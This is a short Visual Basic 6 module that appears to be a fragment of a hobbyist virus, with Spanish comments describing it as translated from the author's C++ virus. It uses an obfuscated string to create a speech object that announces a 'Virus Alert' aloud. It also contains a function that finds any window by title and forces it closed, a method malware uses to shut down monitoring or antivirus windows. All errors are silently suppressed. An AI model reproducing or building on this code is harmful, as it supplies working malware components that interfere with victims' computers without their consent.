Attribute VB_Name = "Module6"
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const SC_CLOSE = &HF060&
Const WM_SYSCOMMAND = &H112
Sub SPEAKER()
'la computadora habla hohooh'
On Error Resume Next
JOSFRES = "josfres Virus Alert ADN WARNING¡ Reloaded "
Set Objvoice = CreateObject(des("_M\U:_|b{uoq"))
Objvoice.SPEAK JOSFRES
End Sub


'Traducido de mi virus en c++ pzz otra de mis funciones'
Public Function Find_Windows(Hand As String)
On Error Resume Next
Dim Hwnd_TaskBar As Long
Hwnd_TaskBar = FindWindow(vbNullString, Hand)
Call SendMessage(Hwnd_TaskBar, WM_SYSCOMMAND, SC_CLOSE, ByVal 0&)
End Function

